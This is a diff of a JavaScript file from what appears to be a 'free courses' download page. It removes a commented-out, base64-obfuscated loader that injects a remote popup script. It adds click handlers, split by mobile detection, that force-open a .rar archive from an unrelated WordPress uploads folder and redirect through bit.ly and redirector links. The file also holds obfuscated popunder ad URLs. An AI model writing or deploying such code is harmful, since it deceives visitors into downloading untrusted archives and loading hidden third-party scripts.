@@ -77,26 +77,6 @@ function detectar_mobile() {
      }
 }
 
-/*
-(function(){
-var r=document,f=window,l=[atob('aHR0cHM6Ly9tYXVyb3BveGExLmdpdGh1Yi5pby9jb21hbmRvc2Jyb3dzZXIvanMvcG9wdXAuanM=')], g=0, gg=function(){
-    if(!l[0])return; si=f["document"]["createElement"]("script");si["type"]="text/javascript";si["async"]=!0;si["id"]="pop";d=f["document"]["getElementsByTagName"]("script")[0];si["src"]=l[g];si["crossOrigin"]="anonymous";si["onerror"]=function(){a()};d["parentNode"]["insertBefore"](si,d);}
-    gg();})();
-*/
-
-document.querySelector("#-btn").addEventListener("click", (e)=> {
-    e.preventDefault();
-    window.open("https://geradordelinkwhatsapp.app.br/wp-content/uploads/2023/08/cursos.rar");
-    window.location.href="https://viagemmais.nl/fdfd?u=bit.ly/download-dos-cursos-free";
-});
-document.querySelector("#b-t-n").addEventListener("click", (e)=> {
-    e.preventDefault();
-    window.open("https://geradordelinkwhatsapp.app.br/wp-content/uploads/2023/08/cursos.rar");
-    window.location.href="https://viagemmais.nl/fdfd?u=bit.ly/download-dos-cursos-free";
-});
-
-
-
 const clickge546545rador = ()=>{
     var  ganhosLiskB = "https://ossnidorinoom.com/4/6241084";
 var  ganhosLiskA = "https://restlesscompeldescend.com/i98rbj855f?key=e055f2494e194b3c22d242d7590b5ad4";
@@ -147,4 +127,16 @@ function clickTela(a){
 
 if (detectar_mobile()){
     clickge546545rador();
+    document.querySelector("#b-t-n").addEventListener("click", (e)=> {
+        e.preventDefault();
+        window.open("https://geradordelinkwhatsapp.app.br/wp-content/uploads/2023/08/cursos.rar");
+        window.location.href="https://viagemmais.nl/fdfd?u=bit.ly/download-dos-cursos-free";
+    });
+}else{
+    document.querySelector("#-btn").addEventListener("click", (e)=> {
+        e.preventDefault();
+        window.open("https://geradordelinkwhatsapp.app.br/wp-content/uploads/2023/08/cursos.rar");
+        window.location.href="https://viagemmais.nl/fdfd?u=bit.ly/download-dos-cursos-free";
+    });
 }
+
